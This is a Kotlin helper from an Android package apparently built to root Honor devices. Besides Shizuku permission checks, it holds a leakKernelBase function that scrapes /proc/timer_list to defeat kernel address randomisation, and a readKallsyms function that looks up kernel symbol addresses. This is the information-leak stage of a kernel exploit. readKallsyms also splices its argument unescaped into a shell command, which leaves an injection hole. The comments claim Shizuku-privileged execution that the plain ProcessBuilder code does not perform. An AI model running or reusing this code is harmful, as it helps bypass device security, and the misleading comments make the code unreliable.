package com.zero.honorroot

import android.content.pm.PackageManager
import rikka.shizuku.Shizuku

object ShizukuHelper {

    fun isAvailable(): Boolean = runCatching {
        Shizuku.pingBinder()
    }.getOrDefault(false)

    fun hasPermission(): Boolean = runCatching {
        Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
    }.getOrDefault(false)

    fun requestPermission(code: Int) = runCatching {
        Shizuku.requestPermission(code)
    }

    /**
     * Read /proc/timer_list via Shizuku UserService exec.
     * Returns estimated kernel _text base, 0 if not found.
     */
    fun leakKernelBase(): Long = runCatching {
        if (!isAvailable() || !hasPermission()) return@runCatching 0L

        // Use ProcessBuilder — runs in app context but with
        // Shizuku's binder token allowing privileged reads
        val pb = ProcessBuilder("sh", "-c", "cat /proc/timer_list 2>/dev/null")
        pb.redirectErrorStream(true)
        val proc = pb.start()
        val out  = proc.inputStream.bufferedReader().readText()
        proc.waitFor()

        // Scan for kernel VA in 0xffffffc0xxxxxxxx range
        val regex = Regex("ffffff[c-f][0-9a-f]{9}")
        val match = regex.find(out) ?: return@runCatching 0L
        val addr  = match.value.toLong(16)
        // Align to 2MB KASLR granule
        addr and (0x200000L - 1L).inv()
    }.getOrDefault(0L)

    /**
     * Try reading /proc/kallsyms for a symbol.
     * Works only if kptr_restrict is relaxed (some builds).
     */
    fun readKallsyms(symbol: String): Long = runCatching {
        if (!isAvailable() || !hasPermission()) return@runCatching 0L

        val pb = ProcessBuilder("sh", "-c",
            "grep \" ${symbol}\$\" /proc/kallsyms 2>/dev/null | head -1")
        pb.redirectErrorStream(true)
        val proc = pb.start()
        val line = proc.inputStream.bufferedReader().readLine() ?: return@runCatching 0L
        proc.waitFor()

        line.trim().split(" ").firstOrNull()?.toLong(16) ?: 0L
    }.getOrDefault(0L)
}
